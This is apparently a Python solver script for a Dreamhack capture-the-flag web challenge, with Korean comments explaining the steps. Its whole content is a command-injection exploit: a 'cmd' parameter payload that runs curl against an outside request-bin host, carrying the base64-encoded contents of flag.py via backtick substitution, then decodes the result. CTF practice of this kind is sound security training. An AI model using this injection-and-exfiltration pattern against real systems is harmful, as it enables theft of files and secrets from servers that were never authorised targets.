from bs4 import BeautifulSoup
import requests

URL = "http://host3.dreamhack.games:9527"
PAYLOAD = '/?cmd=curl https://enfvwx1icxite.x.pipedream.net/`cat flag.py | base64`'

resp = requests.head(URL + PAYLOAD)

'''
요청 보내고 requestbin으로 확인해야함!!
1. curl 다음에 오는 링크에 requestbin 링크 삽입
2. 요청으로 들어오는 base64 값 확인
3. base64 인코딩값 디코딩해서 평문 flag 값 확인
'''